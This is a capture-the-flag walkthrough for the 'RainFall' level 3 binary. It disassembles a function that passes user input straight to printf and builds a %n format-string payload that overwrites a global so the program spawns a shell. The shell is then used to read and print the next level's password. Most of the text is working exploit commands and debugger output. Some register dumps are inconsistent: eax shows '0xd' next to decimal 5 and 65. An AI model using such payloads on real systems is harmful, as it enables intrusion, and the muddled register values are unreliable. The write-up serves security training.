# Level3

    (gdb) disas main
    Dump of assembler code for function main:
    0x0804851a <+0>:	push   %ebp
    0x0804851b <+1>:	mov    %esp,%ebp
    0x0804851d <+3>:	and    $0xfffffff0,%esp
    0x08048520 <+6>:	call   0x80484a4 <v>
    0x08048525 <+11>:	leave  
    0x08048526 <+12>:	ret    
    End of assembler dump.
    (gdb) disas v
    Dump of assembler code for function v:
    0x080484a4 <+0>:	push   %ebp
    0x080484a5 <+1>:	mov    %esp,%ebp
    0x080484a7 <+3>:	sub    $0x218,%esp
    0x080484ad <+9>:	mov    0x8049860,%eax
    0x080484b2 <+14>:	mov    %eax,0x8(%esp)
    0x080484b6 <+18>:	movl   $0x200,0x4(%esp)
    0x080484be <+26>:	lea    -0x208(%ebp),%eax
    0x080484c4 <+32>:	mov    %eax,(%esp)
    0x080484c7 <+35>:	call   0x80483a0 <fgets@plt>
    0x080484cc <+40>:	lea    -0x208(%ebp),%eax
    0x080484d2 <+46>:	mov    %eax,(%esp)
    0x080484d5 <+49>:	call   0x8048390 <printf@plt>
    0x080484da <+54>:	mov    0x804988c,%eax
    0x080484df <+59>:	cmp    $0x40,%eax
    0x080484e2 <+62>:	jne    0x8048518 <v+116>
    0x080484e4 <+64>:	mov    0x8049880,%eax
    0x080484e9 <+69>:	mov    %eax,%edx
    0x080484eb <+71>:	mov    $0x8048600,%eax
    0x080484f0 <+76>:	mov    %edx,0xc(%esp)
    0x080484f4 <+80>:	movl   $0xc,0x8(%esp)
    0x080484fc <+88>:	movl   $0x1,0x4(%esp)
    0x08048504 <+96>:	mov    %eax,(%esp)
    0x08048507 <+99>:	call   0x80483b0 <fwrite@plt>
    0x0804850c <+104>:	movl   $0x804860d,(%esp)
    0x08048513 <+111>:	call   0x80483c0 <system@plt>
    0x08048518 <+116>:	leave  
    0x08048519 <+117>:	ret    
    End of assembler dump.

The main simply calls the v function. It simply prints back the characters read from the stdin with printf.

We can also see a check that will run a shell if the value is set to 0x40 (hex) / 64 (dec), but we can't interact with it directly.

However, there is no formatted string during the printf call, the argument is instead passed directly to printf (cf source file). This is a vulerability that we can exploit.

With a specific input, we can print the content of the stack : 

    level3@RainFall:~$ ./level3
    AAAA BBBB %x %x %x %x %x %x %x %x %x %x
    AAAA BBBB 200 b7fd1ac0 b7ff37d0 41414141 42424220 78252042 20782520 25207825 78252078 20782520

We see that the 4th %x prints the beginning of our input. A very interesting printf modifier is %n. This modifier won't print anything, but will store the length of the string in the pointed location. And this location must be a pointer to a signed int. Luckily for us, a memory address can be used.

If we go back to the v function :

    [...]
    0x080484da <+54>:	mov    0x804988c,%eax
    0x080484df <+59>:	cmp    $0x40,%eax
    [...]

This code will move the value stored in 0x0804988c to the EAX register, then compare this register with the value 0x40. That means, if we can manually set the value stored in 0x804988c to 0x40, the check will succeed and we'll be able to run the shell.

First of all, let's send the address above to see if our idea works.

    $ python -c 'print "\x8c\x98\x04\x08"+"%4$n"' > payload

The syntax '%4$n' will change the 4th value without having to use the previous ones, since we only want to change this one.
We set a breakpoint rihght after the printf call, to see if we successfully overflowed the register :

    (gdb) b *0x080484da
    Breakpoint 1 at 0x80484da
    (gdb) run < payload 
    Starting program: /home/user/level3/level3 < payload
    �

    Breakpoint 1, 0x080484da in v ()
    (gdb) i r
    eax            0xd	5
    ecx            0x0	0
    edx            0x0	0
    ebx            0xb7fd0ff4	-1208152076
    esp            0xbffff510	0xbffff510
    ebp            0xbffff728	0xbffff728
    esi            0x0	0
    edi            0x0	0
    eip            0x80484da	0x80484da <v+54>
    eflags         0x200282	[ SF IF ID ]
    cs             0x73	115
    ss             0x7b	123
    ds             0x7b	123
    es             0x7b	123
    fs             0x0	0
    gs             0x33	51

Our string was 5 characters long (%4$n is a modifier but is included as well, however it won't count for some reason), and we got a value of 5. To have a size of 64, we simply need to add 60 more characters.

    $ python -c 'print "\x8c\x98\x04\x08"+"Y"*60+"%4$n"' > payload

Let's check:

    [...]
       Breakpoint 1, 0x080484da in v ()
    (gdb) i r
    eax            0xd	65
    ecx            0x0	0
    edx            0x0	0
    [...]
    (gdb) c
    Continuing.
    Wait what?!
    [Inferior 1 (process 13240) exited normally]

Now we run it without gdb:

    level3@RainFall:~$ cat payload - | ./level3 
    �YYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYY
    Wait what?!
    cd ../level4
    cat .pass
    b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
